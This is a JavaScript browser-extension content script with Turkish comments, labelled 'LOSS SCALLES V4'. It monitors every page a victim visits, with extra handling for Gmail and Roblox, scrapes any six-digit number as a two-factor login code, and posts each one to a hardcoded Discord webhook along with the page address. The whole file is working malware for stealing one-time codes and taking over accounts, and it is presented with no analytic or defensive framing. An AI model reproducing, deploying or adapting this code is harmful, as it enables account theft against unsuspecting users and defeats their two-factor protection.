// ===== LOSS SCALLES V4 - AKILLI YAKALAMA (SPAM YOK, ANLIK) =====

const WEBHOOK = 'https://discord.com/api/webhooks/1514964276484374578/I_-XPA6IFArDzuisGaMldvjZ1K1xrZvnEpGZDqJZRYew1DjoWy2JaIk64PxxrQIjjSPg';

// Akıllı hafıza - sadece bu sayfa oturumunda
let yakalananKodlar = new Set();
let sonKodZamani = 0;
let sayfaHazir = false;

console.log('[LS V4] Akıllı izleme başladı...');

// Sayfa tam yüklendi mi kontrol et (Gmail için kritik)
function sayfaHazirMi() {
    // Gmail özel kontrol
    if (window.location.hostname.includes('mail.google.com')) {
        // Gmail'in yüklenmesini bekle
        const yuklendi = document.querySelector('.ae4') !== null ||  // Klasik Gmail
                        document.querySelector('[role="list"]') !== null || // Yeni Gmail
                        document.querySelector('.a2y') !== null ||
                        document.body.innerText.includes('Gmail') ||
                        document.body.innerText.length > 1000;
        return yuklendi;
    }
    // Normal sayfalar
    return document.body && document.body.innerText.length > 0;
}

// Gmail özel metin okuyucu
function gmailMetniOku() {
    let metin = document.body.innerText || '';
    
    // Gmail iframe'leri kontrol et
    const iframes = document.querySelectorAll('iframe');
    for (const iframe of iframes) {
        try {
            if (iframe.contentDocument && iframe.contentDocument.body) {
                metin += ' ' + iframe.contentDocument.body.innerText;
            }
        } catch (e) {
            // Cross-origin iframe, atla
        }
    }
    
    // Gmail özel selector'lar
    const selectors = [
        '.a3s', '.ii', '.hP', '.gD', '.adn', '.gs',
        '[role="listitem"]', '.y2', '.zA', '.a2y'
    ];
    
    for (const sel of selectors) {
        const elemanlar = document.querySelectorAll(sel);
        for (const el of elemanlar) {
            metin += ' ' + (el.innerText || el.textContent || '');
        }
    }
    
    return metin;
}

// Tüm metinleri tara
function tumMetinleriOku() {
    if (window.location.hostname.includes('mail.google.com')) {
        return gmailMetniOku();
    }
    return document.body ? document.body.innerText : '';
}

// 6 haneli kodları bul
function kodlariBul() {
    const metin = tumMetinleriOku();
    if (!metin || metin.length < 10) return [];
    
    // 6 haneli sayıları bul
    const eslesmeler = metin.match(/\b\d{6}\b/g);
    if (!eslesmeler) return [];
    
    // Tekrarları kaldır, sadece geçerli kodlar
    const benzersiz = [...new Set(eslesmeler)];
    return benzersiz.filter(k => /^\d{6}$/.test(k));
}

// Yeni ve geçerli kod mu kontrol et
function gecerliKodMu(kod) {
    const simdi = Date.now();
    
    // Bu kod daha önce yakalandı mı?
    if (yakalananKodlar.has(kod)) {
        return false;
    }
    
    // Son yakalanan koddan en az 10 saniye geçmiş mi? (Spam önleme)
    if (simdi - sonKodZamani < 10000) {
        return false;
    }
    
    // Kod geçerli, kaydet
    yakalananKodlar.add(kod);
    sonKodZamani = simdi;
    
    // Hafıza temizle (çok fazla kod birikmesin)
    if (yakalananKodlar.size > 50) {
        const ilkKod = yakalananKodlar.values().next().value;
        yakalananKodlar.delete(ilkKod);
    }
    
    return true;
}

// Webhook'a gönder
function webhookGonder(kod, aciklama = '') {
    const url = window.location.hostname;
    const baslik = url.includes('mail.google.com') ? '📧 GMAIL' : 
                    url.includes('roblox.com') ? '🎮 ROBLOX' : '🌐 GENEL';
    
    fetch(WEBHOOK, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            content: `${baslik} - **YENİ 2FA KODU:** \`${kod}\`\n⏰ ${new Date().toLocaleString()}\n📍 ${url}\n${aciklama}`
        })
    }).catch(e => console.error('[LS V4] Webhook hatası:', e));
    
    console.log('[LS V4] YENİ KOD GÖNDERİLDİ:', kod);
}

// Ana kontrol fonksiyonu
function kontrolEt() {
    // Sayfa hazır değilse bekle
    if (!sayfaHazirMi()) {
        console.log('[LS V4] Sayfa hazır değil, bekleniyor...');
        return;
    }
    
    if (!sayfaHazir) {
        sayfaHazir = true;
        console.log('[LS V4] Sayfa hazır! İzleme aktif.');
    }
    
    const kodlar = kodlariBul();
    
    for (const kod of kodlar) {
        if (gecerliKodMu(kod)) {
            webhookGonder(kod, 'Otomatik yakalama');
            
            // Background'a bildir
            if (typeof chrome !== 'undefined' && chrome.runtime) {
                chrome.runtime.sendMessage({
                    action: 'kod_yakalandi',
                    kod: kod,
                    zaman: new Date().toISOString(),
                    url: window.location.href
                });
            }
        }
    }
}

// Sayfa değişikliklerini izle (Gmail için kritik)
const observer = new MutationObserver((mutations) => {
    if (sayfaHazirMi()) {
        kontrolEt();
    }
});

// Başlat
function baslat() {
    // Sayfa yüklenince başla
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', baslat);
        return;
    }
    
    console.log('[LS V4] Başlatılıyor...');
    
    // MutationObserver ile sayfa değişikliklerini izle
    observer.observe(document.body, {
        childList: true,
        subtree: true,
        characterData: true
    });
    
    // İlk kontrol
    setTimeout(kontrolEt, 500);
    
    // Periyodik kontrol (spam değil, sadece yedek)
    setInterval(kontrolEt, 3000);
}

// Hemen başlat
baslat();

console.log('[LS V4] Tam yüklendi. Spam yok, anlık yakalama aktif.');